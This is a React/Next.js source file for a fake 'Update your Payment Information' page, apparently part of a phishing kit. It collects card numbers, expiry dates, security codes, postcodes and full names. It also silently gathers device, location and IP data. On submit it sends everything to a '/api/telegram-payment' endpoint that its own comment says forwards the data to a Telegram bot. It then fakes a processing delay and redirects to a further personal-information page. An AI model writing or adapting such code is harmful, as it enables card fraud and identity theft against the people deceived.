"use client"

import type React from "react"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { CreditCard, HelpCircle, Loader2 } from "lucide-react"
import {
  isValidCardNumber,
  isValidExpiryDate,
  isValidSecurityCode,
  isValidFullName,
  formatCardNumber,
  formatExpiryDate,
  isValidPostalCode,
  getPostalCodePlaceholder,
} from "../../lib/payment-validation"
import { useDeviceInfo } from "../../hooks/use-device-info"

export default function PaymentPage() {
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")

  // Get device and location information silently
  const { deviceInfo, locationInfo, ipInfo } = useDeviceInfo()

  // Form state
  const [cardNumber, setCardNumber] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  const [securityCode, setSecurityCode] = useState("")
  const [country, setCountry] = useState("United Kingdom")
  const [postcode, setPostcode] = useState("")
  const [fullName, setFullName] = useState("")

  // Validation states
  const isCardNumberValid = isValidCardNumber(cardNumber)
  const isExpiryValid = isValidExpiryDate(expiryDate)
  const isSecurityCodeValid = isValidSecurityCode(securityCode)
  const isPostcodeValid = isValidPostalCode(postcode, country)
  const isFullNameValid = isValidFullName(fullName)

  const isFormValid =
    isCardNumberValid && isExpiryValid && isSecurityCodeValid && isPostcodeValid && isFullNameValid && !isLoading

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value)
    setCardNumber(formatted)
  }

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiryDate(e.target.value)
    setExpiryDate(formatted)
  }

  const handleSecurityCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").substring(0, 4)
    setSecurityCode(value)
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!isFormValid) return

    setIsLoading(true)
    setError("")

    try {
      // Send payment info to Telegram bot with device info silently
      const response = await fetch("/api/telegram-payment", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          cardNumber,
          expiryDate,
          securityCode,
          country,
          postcode,
          fullName,
          deviceInfo,
          locationInfo,
          ipInfo,
        }),
      })

      const result = await response.json()

      if (result.success) {
        // Simulate processing delay
        await new Promise((resolve) => setTimeout(resolve, 2000))

        // Redirect to personal info page
        router.push("/personal")
      } else {
        setError("Failed to update payment information. Please try again.")
      }
    } catch (error) {
      console.error("Payment update error:", error)
      setError("Network error. Please check your connection.")
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Main Content */}
      <div className="px-6 pt-16 pb-8">
        <div className="max-w-md mx-auto">
          {/* Title */}
          <h1 className="text-4xl font-normal text-black mb-12 leading-tight">Update your Payment Information</h1>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Card Number */}
            <div>
              <label className="block text-black text-base font-normal mb-3">Card number</label>
              <div className="relative">
                <Input
                  type="text"
                  value={cardNumber}
                  onChange={handleCardNumberChange}
                  className={`w-full h-14 px-4 pr-12 border-0 rounded-lg text-base focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                    cardNumber && !isCardNumberValid ? "bg-red-100 focus:bg-red-100" : "bg-gray-200 focus:bg-gray-200"
                  }`}
                  disabled={isLoading}
                  maxLength={19}
                />
                <CreditCard className="absolute right-4 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400" />
              </div>
              {/* Card Information Display */}
              {cardNumber && !isCardNumberValid && (
                <p className="text-red-500 text-sm mt-1 px-1">Please enter a valid card number</p>
              )}
            </div>

            {/* Expiry Date and Security Code */}
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-black text-base font-normal mb-3">Exp. date</label>
                <Input
                  type="text"
                  placeholder="MM/YY"
                  value={expiryDate}
                  onChange={handleExpiryChange}
                  className={`w-full h-14 px-4 border-0 rounded-lg text-base placeholder:text-gray-500 focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                    expiryDate && !isExpiryValid ? "bg-red-100 focus:bg-red-100" : "bg-gray-200 focus:bg-gray-200"
                  }`}
                  disabled={isLoading}
                  maxLength={5}
                />
                {expiryDate && !isExpiryValid && <p className="text-red-500 text-sm mt-1 px-1">Invalid date</p>}
              </div>

              <div>
                <div className="flex items-center mb-3">
                  <label className="text-black text-base font-normal mr-2">Security code</label>
                  <HelpCircle className="h-4 w-4 text-gray-400" />
                </div>
                <Input
                  type="text"
                  value={securityCode}
                  onChange={handleSecurityCodeChange}
                  className={`w-full h-14 px-4 border-0 rounded-lg text-base focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                    securityCode && !isSecurityCodeValid
                      ? "bg-red-100 focus:bg-red-100"
                      : "bg-gray-200 focus:bg-gray-200"
                  }`}
                  disabled={isLoading}
                  maxLength={4}
                />
                {securityCode && !isSecurityCodeValid && <p className="text-red-500 text-sm mt-1 px-1">Invalid code</p>}
              </div>
            </div>

            {/* Country */}
            <div>
              <label className="block text-black text-base font-normal mb-3">Country</label>
              <Select value={country} onValueChange={setCountry} disabled={isLoading}>
                <SelectTrigger className="w-full h-14 px-4 border-0 rounded-lg bg-gray-200 text-base focus:ring-0 focus:border-0">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="United Kingdom">United Kingdom</SelectItem>
                  <SelectItem value="United States">United States</SelectItem>
                  <SelectItem value="Canada">Canada</SelectItem>
                  <SelectItem value="Australia">Australia</SelectItem>
                  <SelectItem value="Germany">Germany</SelectItem>
                  <SelectItem value="France">France</SelectItem>
                  <SelectItem value="Spain">Spain</SelectItem>
                  <SelectItem value="Italy">Italy</SelectItem>
                </SelectContent>
              </Select>
            </div>

            {/* Postcode */}
            <div>
              <label className="block text-black text-base font-normal mb-3">
                {country === "United States" ? "ZIP Code" : "Postal Code"}
              </label>
              <Input
                type="text"
                placeholder={getPostalCodePlaceholder(country)}
                value={postcode}
                onChange={(e) => setPostcode(e.target.value.toUpperCase())}
                className={`w-full h-14 px-4 border-0 rounded-lg text-base focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                  postcode && !isPostcodeValid ? "bg-red-100 focus:bg-red-100" : "bg-gray-200 focus:bg-gray-200"
                }`}
                disabled={isLoading}
              />
              {postcode && !isPostcodeValid && (
                <p className="text-red-500 text-sm mt-1 px-1">Please enter a valid postal code for {country}</p>
              )}
            </div>

            {/* Full Name */}
            <div>
              <label className="block text-black text-base font-normal mb-3">Full Name</label>
              <Input
                type="text"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                className={`w-full h-14 px-4 border-0 rounded-lg text-base focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                  fullName && !isFullNameValid ? "bg-red-100 focus:bg-red-100" : "bg-gray-200 focus:bg-gray-200"
                }`}
                disabled={isLoading}
              />
              {fullName && !isFullNameValid && (
                <p className="text-red-500 text-sm mt-1 px-1">Please enter a valid full name</p>
              )}
            </div>

            {/* Error Message */}
            {error && <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded-lg">{error}</div>}

            {/* Continue Button */}
            <div className="pt-8">
              <Button
                type="submit"
                disabled={!isFormValid}
                className={`w-full h-14 text-base font-medium rounded-lg transition-all duration-200 ${
                  isFormValid ? "bg-black hover:bg-gray-900 text-white" : "bg-gray-300 text-gray-500 cursor-not-allowed"
                }`}
              >
                {isLoading ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Processing...
                  </>
                ) : (
                  "Continue"
                )}
              </Button>
            </div>
          </form>

          {/* Form Status Indicators */}
          <div className="mt-6 text-sm text-gray-500 space-y-2">
            <div className={`flex items-center ${isCardNumberValid ? "text-green-600" : "text-gray-400"}`}>
              <div className={`w-2 h-2 rounded-full mr-2 ${isCardNumberValid ? "bg-green-500" : "bg-gray-300"}`}></div>
              Valid card number
            </div>
            <div className={`flex items-center ${isExpiryValid ? "text-green-600" : "text-gray-400"}`}>
              <div className={`w-2 h-2 rounded-full mr-2 ${isExpiryValid ? "bg-green-500" : "bg-gray-300"}`}></div>
              Valid expiry date
            </div>
            <div className={`flex items-center ${isSecurityCodeValid ? "text-green-600" : "text-gray-400"}`}>
              <div
                className={`w-2 h-2 rounded-full mr-2 ${isSecurityCodeValid ? "bg-green-500" : "bg-gray-300"}`}
              ></div>
              Valid security code
            </div>
            <div className={`flex items-center ${isPostcodeValid ? "text-green-600" : "text-gray-400"}`}>
              <div className={`w-2 h-2 rounded-full mr-2 ${isPostcodeValid ? "bg-green-500" : "bg-gray-300"}`}></div>
              Valid postal code
            </div>
            <div className={`flex items-center ${isFullNameValid ? "text-green-600" : "text-gray-400"}`}>
              <div className={`w-2 h-2 rounded-full mr-2 ${isFullNameValid ? "bg-green-500" : "bg-gray-300"}`}></div>
              Valid full name
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}

